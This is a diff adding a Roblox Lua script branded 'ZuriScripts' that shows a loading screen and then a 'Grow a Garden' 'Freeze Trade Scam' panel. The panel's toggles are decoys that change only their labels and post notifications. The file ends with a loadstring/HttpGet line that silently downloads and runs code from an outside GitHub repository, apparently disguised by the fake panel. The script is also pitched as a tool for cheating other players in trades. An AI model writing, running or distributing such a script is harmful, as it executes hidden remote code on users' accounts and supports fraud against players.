@@ -1,0 +1,314 @@
+--// LOADING SCREEN SCRIPT
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ZuriScriptsUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- Outline Frame
+local Outline = Instance.new("Frame")
+Outline.Name = "Outline"
+Outline.Size = UDim2.new(0, 356, 0, 146)
+Outline.AnchorPoint = Vector2.new(0.5, 0.5)
+Outline.Position = UDim2.new(0.5, 0, 0.5, 0)
+Outline.BackgroundColor3 = Color3.fromRGB(105, 35, 160)
+Outline.BorderSizePixel = 0
+Outline.ClipsDescendants = true
+Outline.ZIndex = 0
+Outline.Parent = ScreenGui
+
+local OutlineCorner = Instance.new("UICorner")
+OutlineCorner.CornerRadius = UDim.new(0, 16)
+OutlineCorner.Parent = Outline
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 350, 0, 140)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(135, 60, 190)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.ZIndex = 1
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 16)
+UICorner.Parent = MainFrame
+
+-- Top row container
+local TopRow = Instance.new("Frame")
+TopRow.Name = "TopRow"
+TopRow.Size = UDim2.new(1, -20, 0, 40)
+TopRow.Position = UDim2.new(0, 10, 0, 10)
+TopRow.BackgroundTransparency = 1
+TopRow.Parent = MainFrame
+
+-- Circular Image
+local Image = Instance.new("ImageLabel")
+Image.Name = "LogoImage"
+Image.Size = UDim2.new(0, 36, 0, 36)
+Image.Position = UDim2.new(0, 0, 0, 2)
+Image.BackgroundTransparency = 1
+Image.Image = "rbxassetid://71932691083123"
+Image.ScaleType = Enum.ScaleType.Fit
+Image.AnchorPoint = Vector2.new(0, 0)
+Image.Parent = TopRow
+
+local ImageCorner = Instance.new("UICorner")
+ImageCorner.CornerRadius = UDim.new(1, 0)
+ImageCorner.Parent = Image
+
+-- Title Text
+local TitleText = Instance.new("TextLabel")
+TitleText.Name = "TitleText"
+TitleText.Size = UDim2.new(1, -46, 1, 0)
+TitleText.Position = UDim2.new(0, 46, 0, 0)
+TitleText.BackgroundTransparency = 1
+TitleText.Text = "Youtube: ZuriScripts"
+TitleText.TextColor3 = Color3.fromRGB(220, 180, 255)
+TitleText.Font = Enum.Font.GothamBold
+TitleText.TextSize = 22
+TitleText.TextXAlignment = Enum.TextXAlignment.Left
+TitleText.Parent = TopRow
+
+-- Loading bar background
+local LoadingBarBackground = Instance.new("Frame")
+LoadingBarBackground.Name = "LoadingBarBackground"
+LoadingBarBackground.Size = UDim2.new(1, -20, 0, 20)
+LoadingBarBackground.Position = UDim2.new(0, 10, 0, 60)
+LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(115, 65, 175)
+LoadingBarBackground.BorderSizePixel = 0
+LoadingBarBackground.ClipsDescendants = true
+LoadingBarBackground.AnchorPoint = Vector2.new(0, 0)
+LoadingBarBackground.Parent = MainFrame
+
+local LBCorner = Instance.new("UICorner")
+LBCorner.CornerRadius = UDim.new(0, 10)
+LBCorner.Parent = LoadingBarBackground
+
+-- Loading bar fill
+local LoadingBarFill = Instance.new("Frame")
+LoadingBarFill.Name = "LoadingBarFill"
+LoadingBarFill.Size = UDim2.new(0, 0, 1, 0)
+LoadingBarFill.Position = UDim2.new(0, 0, 0, 0)
+LoadingBarFill.BackgroundColor3 = Color3.fromRGB(190, 140, 255)
+LoadingBarFill.BorderSizePixel = 0
+LoadingBarFill.Parent = LoadingBarBackground
+
+local LFillCorner = Instance.new("UICorner")
+LFillCorner.CornerRadius = UDim.new(0, 10)
+LFillCorner.Parent = LoadingBarFill
+
+-- Powered By Text
+local PoweredByText = Instance.new("TextLabel")
+PoweredByText.Name = "PoweredByText"
+PoweredByText.Size = UDim2.new(1, -20, 0, 30)
+PoweredByText.Position = UDim2.new(0, 10, 0, 95)
+PoweredByText.BackgroundTransparency = 1
+PoweredByText.Text = "Powered By: LootLabs"
+PoweredByText.TextColor3 = Color3.fromRGB(220, 180, 255)
+PoweredByText.Font = Enum.Font.GothamMedium
+PoweredByText.TextSize = 18
+PoweredByText.TextXAlignment = Enum.TextXAlignment.Center
+PoweredByText.Parent = MainFrame
+
+-- Function to animate loading bar and fade whole UI
+local function animateLoadingBar(duration, callback)
+    local startTime = tick()
+
+    local connection
+    connection = RunService.Heartbeat:Connect(function()
+        local elapsed = tick() - startTime
+        local progress = math.clamp(elapsed / duration, 0, 1)
+        LoadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
+
+        if progress >= 1 then
+            connection:Disconnect()
+
+            local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad)
+            local tweens = {}
+
+            table.insert(tweens, TweenService:Create(MainFrame, tweenInfo, {BackgroundTransparency = 1}))
+            table.insert(tweens, TweenService:Create(Outline, tweenInfo, {BackgroundTransparency = 1}))
+            table.insert(tweens, TweenService:Create(Image, tweenInfo, {ImageTransparency = 1}))
+            table.insert(tweens, TweenService:Create(TitleText, tweenInfo, {TextTransparency = 1}))
+            table.insert(tweens, TweenService:Create(PoweredByText, tweenInfo, {TextTransparency = 1}))
+            table.insert(tweens, TweenService:Create(LoadingBarFill, tweenInfo, {BackgroundTransparency = 1}))
+            table.insert(tweens, TweenService:Create(LoadingBarBackground, tweenInfo, {BackgroundTransparency = 1}))
+
+            for _, tween in ipairs(tweens) do
+                tween:Play()
+            end
+
+            tweens[1].Completed:Wait()
+            ScreenGui:Destroy()
+
+            if callback then
+                task.wait(3) -- wait 3 seconds after fade
+                callback()
+            end
+        end
+    end)
+end
+
+--// RUN LOADING SCREEN FIRST
+animateLoadingBar(5, function()
+
+    --// FREEZE TRADE GUI SCRIPT (unchanged)
+    pcall(function() game.CoreGui.TradeGUI:Destroy() end)
+
+    local TweenService = game:GetService("TweenService")
+    local UIS = game:GetService("UserInputService")
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "TradeGUI"
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = game.CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 0, 0, 0)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -120)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Parent = gui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "🌱 GROW A GARDEN 🌱"
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.TextColor3 = Color3.fromRGB(0, 255, 0)
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.Parent = frame
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0, 20)
+    subtitle.Position = UDim2.new(0, 0, 0, 38)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "FREEZE TRADE SCAM"
+    subtitle.Font = Enum.Font.GothamSemibold
+    subtitle.TextSize = 14
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+    subtitle.TextXAlignment = Enum.TextXAlignment.Center
+    subtitle.Parent = frame
+
+    local footer = Instance.new("TextLabel")
+    footer.Size = UDim2.new(1, 0, 0, 20)
+    footer.Position = UDim2.new(0, 0, 1, -24)
+    footer.BackgroundTransparency = 1
+    footer.Text = "YouTube: ZuriScripts"
+    footer.Font = Enum.Font.GothamBold
+    footer.TextSize = 14
+    footer.TextColor3 = Color3.fromRGB(255, 255, 0)
+    footer.TextXAlignment = Enum.TextXAlignment.Center
+    footer.Parent = frame
+
+    local function createToggle(name, posY)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -20, 0, 36)
+        btn.Position = UDim2.new(0, 10, 0, posY)
+        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        btn.Text = name .. " [OFF]"
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 16
+        btn.AutoButtonColor = false
+        btn.Parent = frame
+
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+        local on = false
+        btn.MouseButton1Click:Connect(function()
+            on = not on
+            if on then
+                btn.Text = name .. " [ON]"
+                btn.BackgroundColor3 = Color3.fromRGB(60, 100, 60)
+                game.StarterGui:SetCore("SendNotification", {
+                    Title = "TRADE SCRIPT",
+                    Text = name .. " has been activated",
+                    Duration = 3
+                })
+            else
+                btn.Text = name .. " [OFF]"
+                btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+            end
+        end)
+    end
+
+    createToggle("Freeze Trade", 68)
+    createToggle("Anti Detected", 108)
+    createToggle("Trade Failed Bypass", 148)
+
+    local exit = Instance.new("TextButton")
+    exit.Size = UDim2.new(0, 28, 0, 28)
+    exit.Position = UDim2.new(1, -14, 0, -14)
+    exit.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    exit.Text = "X"
+    exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+    exit.Font = Enum.Font.GothamBold
+    exit.TextSize = 16
+    exit.ZIndex = 10
+    exit.AutoButtonColor = false
+    exit.Parent = frame
+    Instance.new("UICorner", exit).CornerRadius = UDim.new(0, 6)
+
+    exit.MouseEnter:Connect(function()
+        TweenService:Create(exit, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(170, 40, 40)}):Play()
+    end)
+    exit.MouseLeave:Connect(function()
+        TweenService:Create(exit, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}):Play()
+    end)
+
+    local function fadeOutAndDestroy()
+        for _,obj in ipairs(frame:GetDescendants()) do
+            if obj:IsA("TextLabel") or obj:IsA("TextButton") then
+                TweenService:Create(obj, TweenInfo.new(0.25), {
+                    TextTransparency = 1,
+                    BackgroundTransparency = 1
+                }):Play()
+            end
+        end
+        TweenService:Create(frame, TweenInfo.new(0.25), {BackgroundTransparency = 1}):Play()
+        task.wait(0.3)
+        gui:Destroy()
+    end
+    exit.MouseButton1Click:Connect(fadeOutAndDestroy)
+
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+                                       startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 300, 0, 240)
+    }):Play()
+
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkSpawner-Script/Spawner/refs/heads/main/lua"))()
